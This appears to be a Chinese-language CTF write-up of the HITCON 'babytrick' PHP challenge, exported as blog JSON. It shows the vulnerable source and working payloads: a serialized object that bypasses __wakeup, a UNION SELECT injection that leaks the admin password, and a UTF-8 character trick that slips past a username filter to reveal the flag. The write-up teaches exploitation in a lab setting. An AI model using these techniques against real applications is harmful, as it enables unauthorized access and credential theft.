{"title":"HITCON-babytrick","slug":"HITCON-Babytrick","date":"2018-03-23T07:13:47.000Z","updated":"2019-08-01T11:50:29.876Z","comments":true,"path":"api/articles/HITCON-Babytrick.json","photos":[],"link":"","excerpt":"too hard","covers":null,"content":"<p>too hard</p>\n<a id=\"more\"></a>\n<h1 id=\"HITCON-babytrick\"><a href=\"#HITCON-babytrick\" class=\"headerlink\" title=\"HITCON-babytrick\"></a>HITCON-babytrick</h1><p>##0x01 需要注意的点 ##</p>\n<ul>\n<li>php反序列化</li>\n<li>简单的注入</li>\n<li>字符集绕过</li>\n</ul>\n<h2 id=\"0x02-源码分析\"><a href=\"#0x02-源码分析\" class=\"headerlink\" title=\"0x02 源码分析\"></a>0x02 源码分析</h2><pre><code>index.php源码\n&lt;?php\n\ninclude &quot;config.php&quot;;\n\nclass HITCON{\nprivate $method;\nprivate $args;\nprivate $conn;\n\npublic function __construct($method, $args) {\n    $this-&gt;method = $method;\n    $this-&gt;args = $args;\n\n    $this-&gt;__conn();\n}\n\nfunction show() {\n    list($username) = func_get_args();\n    $sql = sprintf(&quot;SELECT * FROM users WHERE username=&apos;%s&apos;&quot;, $username);\n\n    $obj = $this-&gt;__query($sql);\n    if ( $obj != false  ) {\n        $this-&gt;__die( sprintf(&quot;%s is %s&quot;, $obj-&gt;username, $obj-&gt;role) );\n    } else {\n        $this-&gt;__die(&quot;Nobody Nobody But You!&quot;);\n    }\n\n}\n\nfunction login() {\n    global $FLAG;\n\n    list($username, $password) = func_get_args();\n    $username = strtolower(trim(mysql_escape_string($username)));\n    $password = strtolower(trim(mysql_escape_string($password)));\n\n    $sql = sprintf(&quot;SELECT * FROM users WHERE username=&apos;%s&apos; AND password=&apos;%s&apos;&quot;, $username, $password);\n\n    if ( $username == &apos;orange&apos; || stripos($sql, &apos;orange&apos;) != false ) {\n        $this-&gt;__die(&quot;Orange is so shy. He do not want to see you.&quot;);\n    }\n\n    $obj = $this-&gt;__query($sql);\n    if ( $obj != false &amp;&amp; $obj-&gt;role == &apos;admin&apos;  ) {\n        $this-&gt;__die(&quot;Hi, Orange! Here is your flag: &quot; . $FLAG);\n    } else {\n        $this-&gt;__die(&quot;Admin only!&quot;);\n    }\n}\n\nfunction source() {\n    highlight_file(__FILE__);\n}\n\nfunction __conn() {\n    global $db_host, $db_name, $db_user, $db_pass, $DEBUG;\n\n    if (!$this-&gt;conn)\n        $this-&gt;conn = mysql_connect($db_host, $db_user, $db_pass);\n    mysql_select_db($db_name, $this-&gt;conn);\n\n    if ($DEBUG) {\n        $sql = &quot;CREATE TABLE IF NOT EXISTS users ( \n                    username VARCHAR(64), \n                    password VARCHAR(64), \n                    role VARCHAR(64)\n                ) CHARACTER SET utf8&quot;;\n        $this-&gt;__query($sql, $back=false);\n\n        $sql = &quot;INSERT INTO users VALUES (&apos;orange&apos;, &apos;$db_pass&apos;, &apos;admin&apos;), (&apos;phddaa&apos;, &apos;ddaa&apos;, &apos;user&apos;)&quot;;\n        $this-&gt;__query($sql, $back=false);\n    } \n\n    mysql_query(&quot;SET names utf8&quot;);\n    mysql_query(&quot;SET sql_mode = &apos;strict_all_tables&apos;&quot;);\n}\n\nfunction __query($sql, $back=true) {\n    $result = @mysql_query($sql);\n    if ($back) {\n        return @mysql_fetch_object($result);\n    }\n}\n\nfunction __die($msg) {\n    $this-&gt;__close();\n\n    header(&quot;Content-Type: application/json&quot;);\n    die( json_encode( array(&quot;msg&quot;=&gt; $msg) ) );\n}\n\nfunction __close() {\n    mysql_close($this-&gt;conn);\n}\n\nfunction __destruct() {\n    $this-&gt;__conn();\n\n    if (in_array($this-&gt;method, array(&quot;show&quot;, &quot;login&quot;, &quot;source&quot;))) {\n        @call_user_func_array(array($this, $this-&gt;method), $this-&gt;args);\n    } else {\n        $this-&gt;__die(&quot;What do you do?&quot;);\n    }\n\n    $this-&gt;__close();\n}\n\nfunction __wakeup() {\n    foreach($this-&gt;args as $k =&gt; $v) {\n        $this-&gt;args[$k] = strtolower(trim(mysql_escape_string($v)));\n    }\n}\n}\n\nif(isset($_GET[&quot;data&quot;])) {\n@unserialize($_GET[&quot;data&quot;]);    \n} else {\nnew HITCON(&quot;source&quot;, array());\n}\n?&gt;\n\n下面的是config.php\n&lt;?php\n$db_host = &apos;localhost&apos;;\n$db_name = &apos;babytrick&apos;;\n$db_user = &apos;babytrick&apos;;\n$db_pass = &apos;babytrick1234&apos;;\n$DEBUG = @$_GET[&apos;noggnogg&apos;];\n$FLAG = &quot;HITCON{php 4nd mysq1 are s0 mag1c, isn&apos;t it?}&quot;;\n?&gt;</code></pre><p>为了在本地更好的复现，修改了部分config.php代码如下：</p>\n<pre><code>&lt;?php\n\n$db_host = &apos;localhost&apos;;\n$db_name = &apos;test1&apos;;\n$db_user = &apos;root&apos;;\n$db_pass = &apos;root&apos;;\n\n$DEBUG = @$_GET[&apos;noggnogg&apos;];\n$FLAG = &quot;HITCON{php 4nd mysq1 are s0 mag1c, isn&apos;t it?}&quot;;\n?&gt;</code></pre><p>分析源码得到ROP链大致为：get参数-&gt;反序列化-&gt;wakeup()-&gt;destruct()。发现现在出现的函数里没有flag的影子，与FLAG有关的在login()函数里</p>\n<pre><code>    $obj = $this-&gt;__query($sql);\nif ( $obj != false &amp;&amp; $obj-&gt;role == &apos;admin&apos;  ) {\n    $this-&gt;__die(&quot;Hi, Orange! Here is your flag: &quot; . $FLAG);\n} else {\n    $this-&gt;__die(&quot;Admin only!&quot;);\n}</code></pre><p>先跟进login()函数查看发现该函数的作用就是将$username和$password带入一条sql语句，在查询之前先进行一次过滤，之后如果查询后的结果满足if判断就可以拿到flag。也就是说我们现在首先要得到username和password的值，再观察代码可以看到conn()函数给出了题目数据库的结构</p>\n<pre><code>+----------+----------+-------+\n| username | password | role  |\n+----------+----------+-------+\n| orange   | $db_pass | admin |\n| phddaa   | ddaa     | user  |\n+----------+----------+-------+</code></pre><p>也就是说我们现在只剩password不知道了。<br>发现show()函数里对传入的参数没有过滤就带入数据库查询，可以在这里尝试注入得到password。</p>\n<p>现在似乎该知道的都知道了，可是发现跟之前的序列化调用路径没有关系啊ε=ε=ε=┏(゜ロ゜;)┛</p>\n<p>再看代码终于在destruct()里找到了这样的代码</p>\n<pre><code>if (in_array($this-&gt;method, array(&quot;show&quot;, &quot;login&quot;, &quot;source&quot;))) {\n@call_user_func_array(array($this, $this-&gt;method), $this-&gt;args);</code></pre><p>这里限制了$method变量的值必须是这几个中的一种，而这三个又分别对应各自的函数。判断通过后调用回调函数将数组类型的args变量当作参数传入array()中执行method指定的方法。关于回调函数可以参考php_manual的介绍</p>\n<pre><code>&lt;?php\nfunction foobar($arg, $arg2) {\necho __FUNCTION__, &quot; got $arg and $arg2\\n&quot;;\n}\nclass foo {\nfunction bar($arg, $arg2) {\n    echo __METHOD__, &quot; got $arg and $arg2\\n&quot;;\n}\n}\n\n\n// Call the foobar() function with 2 arguments\ncall_user_func_array(&quot;foobar&quot;, array(&quot;one&quot;, &quot;two&quot;));\n\n// Call the $foo-&gt;bar() method with 2 arguments\n$foo = new foo;\ncall_user_func_array(array($foo, &quot;bar&quot;), array(&quot;three&quot;, &quot;four&quot;));\n?&gt;\n输出类似于\n\nfoobar got one and two\nfoo::bar got three and four</code></pre><p>好的，终于把思路理清楚了新的ROP为：get参数-&gt;反序列化-&gt;wakeup()-&gt;destruct()-&gt;show()-&gt;login().</p>\n<h2 id=\"0x03开始构造序列化字符串\"><a href=\"#0x03开始构造序列化字符串\" class=\"headerlink\" title=\"0x03开始构造序列化字符串\"></a>0x03开始构造序列化字符串</h2><pre><code>class HITCON{\nprivate $method;\nprivate $args;\n\npublic function __construct($method, $args) {\n    $this-&gt;method = $method;\n    $this-&gt;args = $args;\n}\n}\n$method = &quot;show&quot;;\n$args = array(&quot;1&apos; union select password,username,role from users where username=&apos;orange&apos; -- &quot;);\n$a = new HITCON($method,$args);\necho serialize($a);  \n\nO:6:&quot;HITCON&quot;:3:{s:14:&quot;%00HITCON%00method&quot;;s:4:&quot;show&quot;;s:12:&quot;%00HITCON%00args&quot;;a:1:{i:0;s:77:&quot;1&apos; union select password,username,role from users where username=&apos;orange&apos; -- &quot;;}}</code></pre><p>这里需要注意的是wake_up()对args进行过滤，因此我们要绕过它，把变量的个数设置大于实际个数就可以，还要注意的是私有变量前后会多两个%00长度也多二。知道这些之后就可以得到password了。</p>\n<pre><code>{&quot;msg&quot;:&quot;root is admin&quot;}</code></pre><p>再进行下一步login()：</p>\n<pre><code>    class HITCON{\nprivate $method;\nprivate $args;\n\npublic function __construct($method, $args) {\n    $this-&gt;method = $method;\n    $this-&gt;args = $args;\n}\n    $method = &quot;login&quot;;\n$args = array(&apos;orange&apos;,&apos;root&apos;);\n$b = new HITCON($method,$args);\necho serialize($b);\n\nO:6:&quot;HITCON&quot;:3:{s:14:&quot;%00HITCON%00method&quot;;s:5:&quot;login&quot;;s:12:&quot;%00HITCON%00args&quot;;a:2:{i:0;s:6:&quot;orange&quot;;i:1;s:4:&quot;root&quot;;}}</code></pre><p>得到如下结果</p>\n<pre><code>{&quot;msg&quot;:&quot;Orange is so shy. He do not want to see you.&quot;}</code></pre><p>还需要绕过对orange的判断。由于代码中在链接数据库时设置了字符编码为utf8编码，所以尝试字符差异绕过<br>将a替换成Ã、Ä…这里注意替换完之后长度会加一。同理替换e或着其他的字母都行。</p>\n<pre><code>O:6:&quot;HITCON&quot;:3:{s:14:&quot;%00HITCON%00method&quot;;s:5:&quot;login&quot;;s:12:&quot;%00HITCON%00args&quot;;a:2:{i:0;s:7:&quot;orÄnge&quot;;i:1;s:4:&quot;root&quot;;}}</code></pre><p>得到flag</p>\n<pre><code>{&quot;msg&quot;:&quot;Hi, Orange! Here is your flag: HITCON{php 4nd mysq1 are s0 mag1c, isn&apos;t it?}&quot;}</code></pre><h2 id=\"0x03-总结\"><a href=\"#0x03-总结\" class=\"headerlink\" title=\"0x03 总结\"></a>0x03 总结</h2><p>做题时思路要发散，做题看到反序列化就盯着几个魔法函数不动也不行。</p>\n<p>对于关键的函数一定要好好查查清楚到底啥作用，你问什么是关键函数？一个一个去查手册啊，就像这道题的回调函数，我刚开始看的时候死活找不到怎么把flag和反序列化联系在一起，真的是看的头秃才注意到回调函数/(ㄒoㄒ)/~~。</p>\n<p>构造序列化字符串还不熟，这道题的第二个反序列化做的时候也是没一下想到怎么把username和password传进去，还是自己太菜。</p>\n<h2 id=\"0x04-参考链接\"><a href=\"#0x04-参考链接\" class=\"headerlink\" title=\"0x04 参考链接\"></a>0x04 参考链接</h2><blockquote>\n<p><a href=\"https://www.freebuf.com/vuls/116705.html\" target=\"_blank\" rel=\"noopener\">https://www.freebuf.com/vuls/116705.html</a></p>\n</blockquote>\n<blockquote>\n<p><a href=\"https://blog.csdn.net/qq_42196196/article/details/81217375\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/qq_42196196/article/details/81217375</a></p>\n</blockquote>\n<blockquote>\n<p><a href=\"https://blog.csdn.net/wy_97/article/details/77749008\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/wy_97/article/details/77749008</a></p>\n</blockquote>\n","categories":[{"name":"WP","slug":"WP","count":7,"path":"api/categories/WP.json"}],"tags":[{"name":"WP","slug":"WP","count":5,"path":"api/tags/WP.json"},{"name":"serialize","slug":"serialize","count":4,"path":"api/tags/serialize.json"},{"name":"SQL","slug":"SQL","count":4,"path":"api/tags/SQL.json"}]}